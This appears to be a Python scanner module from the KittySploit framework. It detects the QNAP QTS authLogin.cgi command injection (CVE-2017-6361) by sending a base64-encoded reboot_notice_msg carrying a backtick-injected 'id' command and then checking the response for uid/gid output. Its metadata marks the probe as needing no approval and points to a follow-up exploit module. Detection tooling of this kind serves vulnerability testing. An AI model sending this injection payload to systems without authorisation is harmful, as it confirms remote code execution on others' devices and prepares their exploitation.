#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""QNAP QTS authLogin.cgi reboot_notice_msg RCE (CVE-2017-6361 family)."""

import base64
import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'QNAP QTS - authLogin.cgi RCE Detection (CVE-2017-6361)',
        'description': (
            'Detects QNAP QTS command injection via /cgi-bin/authLogin.cgi?reboot_notice_msg= '
            'base64 payload embedding `(echo;id)>&2` (CVE-2017-6361 / related 2017 advisories).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'qnap', 'nas', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/qnap_cve_2017_6361_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-6361',
            'https://www.qnap.com/en/security-advisory/nas-201703-13',
        ],
        'cve': 'CVE-2017-6361',
    }

    def run(self):
        t = int(time.time()) % 100000000
        raw = f"QNAPVJBD{t}      Disconnect  14`(echo;id)>&2`"
        msg = base64.b64encode(raw.encode()).decode()
        path = f'/cgi-bin/authLogin.cgi?reboot_notice_msg={msg}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='QNAP authLogin.cgi RCE (CVE-2017-6361)',
                path='/cgi-bin/authLogin.cgi',
            )
            return True
        return False
